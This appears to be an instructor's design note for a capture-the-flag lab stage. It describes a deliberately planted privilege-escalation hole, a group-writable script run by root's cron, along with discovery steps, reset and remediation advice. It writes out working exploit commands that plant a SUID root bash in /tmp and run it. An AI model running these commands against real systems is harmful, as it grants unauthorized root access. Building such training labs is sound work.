# Privilege Escalation Design (Stage 5)

> Private — instructor use only.

## The weakness

`/etc/cron.d/admin-tools-cleanup` runs, every minute, as root:
```
* * * * * root bash /opt/admin-tools/cleanup.sh >> /var/log/admin-tools-cleanup.log 2>&1
```
`/opt/admin-tools/cleanup.sh` is owned `root:admin`, mode `664` — **group
`admin` can write to it**, and the Linux `admin` account's primary group
is `admin`. Anything written into that script runs as root within a
minute, no sudo, no SUID binary required to find.

Set up in `vm/scripts/remote-provision.sh` (search for "Phase 5"); reset
via `vm/scripts/reset-privesc.sh`.

## Why it exists (story)

The script is framed as leftover "admin-tools" housekeeping — a cache
cleanup job set up so both the deploy pipeline and the admin account
could update it without needing a request to root each time. Nobody
revisited the permissions after the handover. This is a completely
ordinary, realistic misconfiguration (a shared/group-writable script
invoked by root's cron), not a contrived puzzle.

## How the player is expected to discover it

Standard Linux privilege-escalation enumeration, once they have the
`admin` shell from Stage 4:
1. `ls -la /etc/cron.d/` — shows `admin-tools-cleanup`, unusual name.
2. `cat /etc/cron.d/admin-tools-cleanup` — shows it runs as root, every
   minute, executing `/opt/admin-tools/cleanup.sh`.
3. `ls -la /opt/admin-tools/cleanup.sh` — group `admin`, mode `664`.
   `admin`'s own `id` shows they're in that group.
4. Write to the script (append a command), wait up to 60s, it executes
   as root.

This is a textbook "writable file executed by a privileged cron job"
pattern — common in real-world misconfigurations and widely documented
(e.g. in general Linux privesc enumeration guides), not something that
requires guessing.

## Expected privilege transition

`admin` (uid 1002, gid 110/admin, no sudo at all) → root, by having the
root-run cron job execute attacker-controlled content. Verified in this
session with:
```bash
sudo -u admin bash -c 'echo "cp /bin/bash /tmp/rootbash && chmod 4755 /tmp/rootbash" >> /opt/admin-tools/cleanup.sh'
# wait for the next minute's cron tick
sudo -u admin bash -c '/tmp/rootbash -p -c "id"'
# -> uid=1002(admin) gid=110(admin) euid=0(root) groups=110(admin)
```
Then, as the SUID root shell (not via any instructor `sudo`):
```bash
cat /root/root_note.txt
python3 /opt/tools/flagcrypto.py decrypt "SYN{git_ghost_61ace7b2}" /root/final_evidence.enc -
# -> SYN{root_of_all_evidence_3b7d55a0}  (Original Flag 5, 250 pts)
```
This is a genuine `euid=0` transition performed entirely as `admin`
would, with zero instructor assistance — not a simulated/assumed result.

## Testing it

```
cd vm
./scripts/provision.sh          # (re)installs the weakness if missing
# as admin (or over the real reverse shell during an actual run):
sudo -u admin bash -c 'echo "touch /tmp/privesc_test" >> /opt/admin-tools/cleanup.sh'
# wait up to 60s
ssh -i keys/ctfbuilder_ed25519 -p 2222 ctfbuilder@127.0.0.1 'test -e /tmp/privesc_test && echo OK'
```

## Resetting between teams

```
cd vm
./scripts/reset-privesc.sh
```
Restores `cleanup.sh` to its clean content/permissions, clears known
exploit artifacts (`/tmp/rootbash`, `/tmp/rootshell`, `/tmp/*.suid`,
the cache dir, the log). It is deliberately narrow — it does **not** do
a general `/tmp` wipe, per this project's safety rules. If a team left
an unexpected file outside that pattern, remove it by hand after
reviewing what it is.

## No other privesc shortcuts

- `admin` has no sudo rights at all (`sudo -n -l` as admin: not
  permitted).
- No other SUID/SGID binaries were added beyond the one the exploit
  itself creates (and that gets removed by `reset-privesc.sh`).
- `/etc/cron.d/admin-tools-cleanup` itself is `root:root 644` — only the
  *script it runs* is writable, not the cron definition.

## How to remove this from a non-CTF system

Never make a script writable by a group that an unprivileged account
belongs to if that script is run by root (via cron, a systemd timer, or
anything else privileged). Concretely: `chown root:root` the script and
`chmod 644` it (or tighter), and audit `/etc/cron.d/*`, `crontab -l` for
every account, and systemd timers for any job that executes a path
writable by a non-root user or group.
